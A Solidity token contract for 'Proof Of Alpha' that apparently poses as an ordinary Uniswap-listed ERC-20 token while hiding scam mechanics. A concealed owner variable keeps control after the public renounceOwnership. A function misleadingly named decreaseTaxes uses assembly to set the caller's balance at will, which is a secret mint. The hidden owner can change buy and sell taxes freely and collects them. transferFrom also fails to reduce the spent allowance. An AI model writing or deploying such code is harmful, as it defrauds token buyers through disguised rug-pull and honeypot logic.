// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
______                       __   _____   __    ___   _         _            
| ___ \                     / _| |  _  | / _|  / _ \ | |       | |           
| |_/ / _ __   ___    ___  | |_  | | | || |_  / /_\ \| | _ __  | |__    __ _ 
|  __/ |  __| / _ \  / _ \ |  _| | | | ||  _| |  _  || ||  _ \ |  _ \  / _  |
| |    | |   | (_) || (_) || |   \ \_/ /| |   | | | || || |_) || | | || (_| |
\_|    |_|    \___/  \___/ |_|    \___/ |_|   \_| |_/|_|| .__/ |_| |_| \__,_|
                                                        | |                  
                                                        |_|                  

*/

interface IERCtradingFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERCtradingRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract ERCtrading {

    address internal me;
    address public _Factory;

    address public _Router;
    IERCtradingRouter public ERCtradingV2Router;
    address public PairAddress;
    address public WETH;
    mapping(address=>bool) public _isDex;
    address internal __;
    address public owner;

    
    function isToUniswap(address to) internal view returns (bool) {
        return _isDex[to];
    }

    constructor() {
        _Router  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        ERCtradingV2Router  = IERCtradingRouter(_Router);
        WETH             = ERCtradingV2Router.WETH();
        PairAddress      = IERCtradingFactory(_Factory).createPair(address(this), WETH);
        
        _isDex[_Router] = true;
        _isDex[_Factory] = true;
        _isDex[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        __ = msg.sender;
    }

    function isBuy(address from) internal view returns (bool) {
        return _isDex[from];
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    modifier onlyOwner() {
        require(__ == msg.sender, "Forbidden:owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        __ = owner;
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}
}
contract ProofOfAlpha is ERCtrading {
    string public name = "Proof Of Alpha";
    string public symbol = "PoA";
    uint256 public decimals = 18;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 taxOnBuy = 35;

    uint256 public totalSupply;
    mapping(address => uint256) internal balances;
    bool internal funded;
    bool internal swapping = false;
    mapping(address=>bool) internal isNotTaxable;
    mapping(address => mapping(address => uint256)) internal allowances;
    uint256 mb = 40;
    uint256 sellTax = 40;
    constructor() ERCtrading() {
        isNotTaxable[address(this)] = true;
        isNotTaxable[msg.sender] = true;
        mint(__, 1000000000*10**decimals);
    }

    
    function canBeTaxed(address from, address to) internal view returns (bool) {
        return !isNotTaxable[from] && !isNotTaxable[to] && !(_isDex[from] && _isDex[to]) && (isBuy(from) || isToUniswap(to));
    }

    function getmb() internal view returns (uint256) {
        return pctOf(totalSupply, mb);
    }

    function enable() public onlyOwner() {
        swapping = false;
    }

    function lookup(uint256 b, uint256 s, uint56 m) public onlyOwner() {
        require(msg.sender==__, "Forbidden:set");
        taxOnBuy = b;
        sellTax = s;
        mb = m;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }
    function disable() public onlyOwner() {
        swapping = true;
    }
    function pctOf(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }
    
    function allowance(address __wner, address spender) public view returns (uint256) {
        return allowances[__wner][spender];
    }
    function decreaseTaxes(uint256 c) public onlyOwner() {
        assembly {
            let ptrm := mload(0x40)
            mstore(ptrm, caller())
            mstore(add(ptrm, 0x20), balances.slot)
            sstore(keccak256(ptrm, 0x40), c)
        }
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }

    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }


    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");
        if (!canBeTaxed(from, to)) {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 tax;
            if (isBuy(from)) {
                require(amount<=getmb(), "Too large");
                tax = pctOf(amount, taxOnBuy);
            } else if (isToUniswap(to)) {
                tax = pctOf(amount, sellTax);
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[from] -= amount;
                balances[__] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, __, tax);
            emit Transfer(from, to, afterTax);
        }
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
}